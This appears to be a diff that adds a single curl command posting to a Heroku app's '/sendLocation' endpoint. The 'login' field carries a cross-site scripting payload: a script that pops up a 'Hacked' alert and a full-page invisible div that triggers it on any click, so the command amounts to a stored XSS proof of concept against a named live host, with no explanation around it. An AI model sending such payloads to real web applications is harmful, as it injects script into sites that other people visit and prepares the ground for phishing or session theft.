@@ -1,0 +1,6 @@
+curl --data "lat=1&lng=4&login=<script>
+function phish() {
+alert('Hacked');
+}
+</script>
+<div style='width:100%; height: 100%; position: absolute; top: 0; left: 0;' onclick='phish()'></div>" https://pumpkin-tart-22013.herokuapp.com/sendLocation
